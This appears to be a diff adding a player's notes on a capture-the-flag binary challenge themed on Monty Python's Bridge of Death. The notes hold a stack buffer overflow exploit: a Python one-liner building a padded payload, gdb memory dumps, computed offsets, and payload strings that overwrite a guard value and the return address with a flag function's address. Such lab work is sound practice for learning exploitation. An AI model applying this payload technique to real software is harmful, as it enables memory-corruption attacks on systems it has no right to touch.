@@ -1,0 +1,37 @@
+Right. Off you go.
+flag.txt
+Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
+What... is your name?
+Sir Lancelot of Camelot
+I don't know that! Auuuuuuuugh!
+What... is your quest?
+To seek the Holy Grail.
+What... is my secret?
+
+
+ret (last) 0xf7ddeb41
+flag 0x565556fd
+stores data @ 0xffffd10d
+EBP= 0xffffd148
+EBP-0x10 = 0xffffd138
+
+dif = 43 
+43 then 0xdea110c8
+python -c 'print "A"*39+ "\xc8\x10\xa1\xde"'
+AAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFF���
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���
+
+0xffffd0f0:	0xffffd10d	0x56555a63	0xf7f9e5c0	0x00000000
+0xffffd100:	0x00000000	0xf7f9e000	0xf7df5a89	0x206f5488
+0xffffd110:	0x6b656573	0x65687420	0x6c6f4820	0x72472079
+0xffffd120:	0x2e6c6961	0x5655000a	0xffffd1fc	0x5655593b << 64
+0xffffd130:	0x00000001	0xffffd1f4	0x00000000	0x00000002
+0xffffd140:	0xffffd160	0x00000000	0x00000000	0xf7ddeb41 << 96 to cover, 92 buffer+\xfd\x56\x55\x56
+
+AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFF�VUV
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�VUV
+
+
+
